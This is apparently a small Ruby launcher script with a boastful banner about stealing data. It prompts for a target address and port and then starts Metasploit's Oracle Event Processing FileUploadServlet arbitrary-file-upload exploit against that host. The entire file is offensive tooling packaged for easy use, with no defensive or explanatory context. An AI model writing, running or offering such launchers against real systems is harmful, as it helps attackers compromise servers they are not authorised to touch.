require 'colorize'
puts """

 	      Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...
  
         1st Try {set RPORT 80; 2nd RPORT 8080}

          Oracle Event Processing FileUploadServlet
			    Arbitrary File Upload

Oracle Event Processing 11.1.1.7.0 / Windows 2003 SP2 through WMI
""".white

puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? [Default is 9002] ".blue
print " [!] ---> ".yellow
port = gets.chomp







exec("msfconsole -x 'use exploit/windows/http/oracle_event_processing_upload' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'run'")

